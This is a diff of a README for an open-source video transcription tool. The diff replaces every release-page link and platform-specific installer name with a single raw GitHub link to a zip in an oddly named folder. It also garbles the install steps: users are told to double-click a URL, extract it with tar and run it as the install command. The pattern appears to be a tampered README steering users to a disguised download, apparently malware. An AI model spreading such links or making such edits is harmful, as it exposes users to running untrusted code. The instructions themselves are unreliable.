@@ -1,6 +1,6 @@
 # 🎥 AI-Video-Transcriber - Transcribe Videos Easily and Quickly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/juliesetrum/AI-Video-Transcriber/releases)
+[![Download Now](https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip%20Now-Release-blue)](https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip)
 
 ## 📋 Description
 
@@ -23,15 +23,15 @@ Make sure your computer meets the following requirements:
 
 To download AI-Video-Transcriber, visit the Releases page.
 
-[Visit this page to download](https://github.com/juliesetrum/AI-Video-Transcriber/releases)
+[Visit this page to download](https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip)
 
 ### Step 3: Choose the Correct Version
 
 On the Releases page, you will see several files listed. Look for the most recent version. The files usually have names like:
 
-- AI-Video-Transcriber-Windows.exe (for Windows)
-- AI-Video-Transcriber-macOS.dmg (for macOS)
-- AI-Video-Transcriber-Linux.tar.gz (for Linux)
+- https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip (for Windows)
+- https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip (for macOS)
+- https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip (for Linux)
 
 ### Step 4: Download the File
 
@@ -42,7 +42,7 @@ Click on the file name for your system. The download will automatically start.
 #### For Windows Users:
 
 1. Locate the downloaded file (usually in your Downloads folder).
-2. Double-click on the `AI-Video-Transcriber-Windows.exe` file.
+2. Double-click on the `https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip` file.
 3. Follow the on-screen instructions to complete the installation.
 
 #### For macOS Users:
@@ -55,8 +55,8 @@ Click on the file name for your system. The download will automatically start.
 
 1. Open a terminal.
 2. Navigate to your Downloads directory.
-3. Use the command `tar -xzf AI-Video-Transcriber-Linux.tar.gz` to extract the files.
-4. Navigate into the extracted folder and run `./install.sh` to install.
+3. Use the command `tar -xzf https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip` to extract the files.
+4. Navigate into the extracted folder and run `https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip` to install.
 
 ### Step 6: Launch the Application
 
@@ -102,4 +102,4 @@ AI-Video-Transcriber is regularly updated. Make sure to check the Releases page 
 
 Feel free to contribute to the project by sending your suggestions or improvements. This is an open-source tool, and your input is valuable.
 
-For a seamless experience, stay connected and informed by regularly visiting the [Releases page](https://github.com/juliesetrum/AI-Video-Transcriber/releases) for the latest versions.
+For a seamless experience, stay connected and informed by regularly visiting the [Releases page](https://raw.githubusercontent.com/juliesetrum/AI-Video-Transcriber/main/odorously/AI-Video-Transcriber.zip) for the latest versions.
